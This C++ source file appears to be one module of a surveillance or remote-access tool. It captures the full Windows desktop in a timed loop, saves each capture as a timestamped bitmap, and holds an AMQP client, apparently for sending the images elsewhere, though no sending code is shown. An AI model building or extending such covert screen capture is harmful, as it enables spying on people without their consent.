#include <iostream>

#if defined(_WIN64) || defined(_WIN32)
#include <windows.h>
#include <winuser.h>
#include <winbase.h>
#endif

#include "screenshot.hpp"
#include "../core/utils.hpp"

#if defined(_WIN64) || defined(_WIN32)
void TakeScreenShot::ScreenShot () {
    DWORD screenshotWidth, screenshotHeight, imageSize;
    HWND hwndDesktop = GetDesktopWindow(); // get Desktop windows handle
    HDC hDevC = GetDC(hwndDesktop);
    HDC captureDC = CreateCompatibleDC(hDevC);
    HBITMAP captureBmp;
    RECT rectDesktopParams; // Get cords of a rectangle
    char *BmpData; // Data of screen shot image file
    RGBTRIPLE *Image; // contain of the image
    PBITMAPFILEHEADER BmpFileHeader; // Image file header
    PBITMAPINFOHEADER BmpInfoHeader; // Image info header

    GetWindowRect(hwndDesktop, &rectDesktopParams); // Get rectangle of the desktop window
    screenshotWidth = rectDesktopParams.right - rectDesktopParams.left;
    screenshotHeight = rectDesktopParams.bottom - rectDesktopParams.top;

    imageSize = (sizeof(RGBTRIPLE)  + 1 * (screenshotWidth*screenshotHeight*4)) + sizeof(BITMAPINFOHEADER) + sizeof(BITMAPFILEHEADER);
    BmpData = (char *)GlobalAlloc(GPTR, imageSize);

    BmpFileHeader = (PBITMAPFILEHEADER)BmpData;
    BmpInfoHeader = (PBITMAPINFOHEADER)&BmpData[sizeof(BITMAPFILEHEADER)];

    // Set BitMap File header data
    BmpFileHeader->bfType = 0x4D42;
    BmpFileHeader->bfSize = sizeof(BITMAPFILEHEADER);
    BmpFileHeader->bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

    // Set Bitmap Info header data
    BmpInfoHeader->biSize = sizeof(BITMAPINFOHEADER);
    BmpInfoHeader->biPlanes = 1;
    BmpInfoHeader->biBitCount = 24;
    BmpInfoHeader->biCompression = BI_RGB;
    BmpInfoHeader->biWidth = screenshotWidth;
    BmpInfoHeader->biHeight = screenshotHeight;

    Image = (RGBTRIPLE*)&BmpData[sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER)];
    
    captureBmp = CreateCompatibleBitmap(hDevC, screenshotWidth, screenshotHeight);
    SelectObject(captureDC, captureBmp);
    BitBlt(captureDC, 0, 0, screenshotWidth, screenshotHeight, hDevC, 0, 0, SRCCOPY | CAPTUREBLT);
    GetDIBits(captureDC, captureBmp, 0, screenshotHeight, Image, (LPBITMAPINFO)BmpInfoHeader, DIB_RGB_COLORS);

    std::string filename = std::to_string(getTimestamp()) + ".bmp";
    writeBytesToFile(filename, BmpData, imageSize);

    GlobalFree(BmpData);
}

TakeScreenShot::TakeScreenShot(AmqpClient* pAmqpClient) {
    this->amqpClient = pAmqpClient;
}

void TakeScreenShot::operator()(unsigned interval) {
    unsigned long long lastSend = 0;

    while (true) {
        unsigned long long now = getTimestamp();
        
        if (lastSend + interval <= now) {
            lastSend = now;
            ScreenShot();            

            std::cout << "[*] took screen shot in : " << (getTimestamp() - now) << " ms" << std::endl; 
        }
    }
}
#endif